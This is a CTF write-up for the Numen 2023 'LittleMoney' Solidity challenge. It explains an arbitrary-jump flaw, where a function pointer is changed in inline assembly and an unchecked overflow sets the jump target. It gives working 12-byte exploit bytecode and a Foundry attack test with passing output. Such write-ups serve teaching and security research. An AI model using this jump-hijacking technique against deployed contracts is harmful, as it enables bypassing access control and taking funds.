# Numen CTF 2023 : LittleMoney

### Contract code :
```solidity
pragma solidity 0.8.12;
contract Numen {
    address private owner;

    event SendFlag(address);

    constructor(){
        owner = msg.sender;
    }
    struct func{
        function() internal ptr;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    modifier checkPermission(address addr){
        _;
        permission(addr);
    }

    function permission(address addr)internal view{
        bool con = calcCode(addr);
        require(con,"permission");
        require(msg.sender == addr);
    }

    function calcCode(address addr)internal view returns(bool){
        uint x;
        assembly{
            x := extcodesize(addr)
        }
        if(x == 0){return false;}
        else if(x > 12){return false;}
        else{assembly{return(0x20,0x00)}}
    }

    function execute(address target) external checkPermission(target){
        (bool success,) = target.delegatecall(abi.encode(bytes4(keccak256("func()"))));
        require(!success,"no cover!");
        uint b;
        uint v;
        (b,v) = getReturnData();
        require(b == block.number);

        func memory set;
        set.ptr = renounce;
        assembly {
            mstore(set, add(mload(set),v))
        }
        set.ptr();
    }

    function renounce()public{
        require(owner != address(0));
        owner = address(0);
    }

    function getReturnData()internal pure returns(uint b,uint v){
        assembly {
            if iszero(eq(returndatasize(), 0x40)) { revert(0, 0) }
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, 0x40)
            b := and(mload(ptr), 0x00000000000000000000000000000000000000000000000000000000ffffffff)
            v := mload(add(0x20, ptr))
        }
    }

    function payforflag() public payable onlyOwner {
        require(msg.value == 1, 'I only need a little money!');
        emit SendFlag(msg.sender);
    }


    receive()external payable{
        this;
    }
    fallback()external payable{
        revert();
    }
}
```

The goal is to emit `SendFlag()` which is in `payforflag()`, but it has the onlyOwner modifier, although there's a `renounce()` function, it can only set owner to `address(0)` but not to other address

In `execute()`, it has inline assembly that allow us to change the jump destination of the `ptr` property of the `set` struct in memory

This vulnerability is shown in swcregistry, also it's in some ctf as well, such as the jump challenge from NahamCon EU CTF 2022

https://swcregistry.io/docs/SWC-127#functiontypessol

https://medium.com/authio/solidity-ctf-part-2-safe-execution-ad6ded20e042

We can control the `v` that will affect the jump destination

`execute()` will first perform a delegatecall to the `target` address, requiring it to fail, so we can't use to delegatecall to change the owner address

But we can revert with `b` and `v` as the error message, which `b` has to be the block number and `v` will affect the jump destination

`execute()` has a `checkPermission` modifier which will call `permission()` after the content in `execute()` function is executed that check our target address, it needs to have bytecode not longer than 12 bytes, also it can't be empty

Even we if we change the jump destination we can't bypass the `checkPermission()`, the "return address" to `checkPermission()` is pushed to the stack before the jump, and it will then be pushed to the very bottom of the stack, and it goes back up when it need to jump to `checkPermission()` after `execute()`

If we satisfy the bytecode length requirement, it won't return true in solidity, but it will return in inline assembly in `calcCode()`, and by running the foundry debugger we will know that this line won't be executed at all :
```solidity
require(msg.sender == addr);
```

I guess it's because those are internal functions, and the compiler basically just copying the code to where it is "called", but not making any external calls, I guess thats why when the return in inline assembly is used, it will jump back to `execute()` and return

So we just need to write a bytecode that revert with `b` and `v`, and it doesn't need to be able to call `execute()` itself, we can just call `execute()` with the address of the deployed bytecode as `target`, as the line checking msg.sender == target won't be executed

Then, we have to find out excatly what number `v` has to be, in order to jump to some location we want, like the emit SendFlag()

We can use foundry's debugger to debug, also we can use this to visualize the jumps :

https://bytegraph.xyz/bytecode

```solidity
        func memory set;
        set.ptr = renounce;
        assembly {
            mstore(set, add(mload(set),v))
        }
        set.ptr();
```

When it reaches here, it will basically add `v` with 0x22a, and the sum will be used as the jump destination

![](https://i.imgur.com/TBYNq3T.png)

In EVM, we can't just jump to any location, but only to location with jumpdest

The `payforflag()` function will first check that `msg.value` equals 1 with `require()`, so this section should be the `payforflag()` function :

![](https://i.imgur.com/PBj4Oc6.png)

We can't set the `msg.value` to 1, but if the require statement is passed, it will jump to 0x1f5

![](https://i.imgur.com/HkxJuJc.png)

By calculating the keccak256 hash of the `SendFlag` event will know its emitting that event

```solidity
 »  keccak256(abi.encodePacked("SendFlag(address)"))
0x2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579
```

So our goal is to jump to 0x1f5 and it will emit `SendFlag`

However it's adding 0x22a with `v`, which 0x22a is larger than 0x1f5, but it's not a problem

Although it's using solidity version > 0.8.0, it is performing the addition in inline assembly which has no protection for overflow/underflow, so can just overflow it to get 0x1f5

0x22a + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffcb will overflow and become 0x1f5

So we will return the block number and 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffcb in our target bytecode, but we won't be using something like PUSH32 as it is going to take too much space, we can just subtract from 0 which will underflow, and instead of using PUSH1 0x00, we can use RETURNDATASIZE, as there are no calls before so it is 0, also we can use MSIZE instead of PUSH1 0x20

```
NUMBER
RETURNDATASIZE
MSTORE
PUSH1 0x35
RETURNDATASIZE
SUB
MSIZE
MSTORE
MSIZE
RETURNDATASIZE
REVERT

433d5260353d035952593dfd
```

![](https://i.imgur.com/tJmvokh.png)

It shows that after the `SendFlag()` is emitted, it will jump to 0x64 and stop, however it is not the case for us, as 0x64 is pushed to the stack in the beginning of `payforflag()` that is much earlier than the jumpdest at 0x1f5 that we jumped, by running the foundry debugger, we will know it will jump to the "return address" it set in `execute()` instead, that is 0x17d, which is the code in `checkPermission()` modifier, thats why we still need a bytecode not longer than 12 bytes, as it will still reach the code to check the code size


I will use te Deployer contract to deploy the bytecode which will just return the bytes passed to it in the constructor, storing that as the runtime bytecode

### Foundry test :
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.12;

import "forge-std/Test.sol";
import "../src/NumenCTF.sol";
import "../src/deploy_bytecode.sol";

contract lenderpoolTest is Test {
    Numen public littlemoney;
    Deployer public target;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        littlemoney = new Numen();
    }

    function testAttack() public {
        vm.startPrank(hacker);
        
        target = new Deployer(hex"433d5260353d035952593dfd");
        vm.recordLogs();
        littlemoney.execute(address(target));
        
        Vm.Log[] memory logs = vm.getRecordedLogs();
        console.logBytes32(logs[0].topics[0]);
        console.log(logs[0].emitter);
        
        assertEq(logs[0].topics[0], keccak256(abi.encodePacked("SendFlag(address)")));
        assertEq(logs[0].emitter, address(littlemoney));
    }
}
```

```
# forge test --match-path test/littlemoney.t.sol -vv
[⠆] Compiling...
No files changed, compilation skipped

Running 1 test for test/littlemoney.t.sol:lenderpoolTest
[PASS] testAttack() (gas: 76489)
Logs:
  0x2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579
  0x88F59F8826af5e695B13cA934d6c7999875A9EeA

Test result: ok. 1 passed; 0 failed; finished in 1.09ms
```